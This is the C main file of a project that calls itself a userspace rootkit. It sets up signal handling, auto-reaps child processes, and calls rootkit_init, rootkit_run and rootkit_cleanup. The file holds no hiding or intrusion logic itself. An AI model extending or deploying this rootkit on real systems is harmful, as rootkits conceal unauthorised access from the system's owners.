#include "userspace/rootkit.h"
#include <signal.h>
#include <stdio.h>

static application_context_t g_rootkit;

static void handle_signal(int sig) {
    (void)sig;
    g_rootkit.running = false;
}

int main(int argc, char *argv[]) {
    (void)argc;

    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    /* Reap children automatically */
    struct sigaction sa = {
        .sa_handler = SIG_IGN,
        .sa_flags = SA_NOCLDWAIT,
    };
    sigaction(SIGCHLD, &sa, NULL);

    if (rootkit_init(&g_rootkit, argv[0]) < 0) {
        perror("Failed to initialize");
        return 1;
    }

    int err = rootkit_run(&g_rootkit);

    rootkit_cleanup(&g_rootkit);
    return err;
}
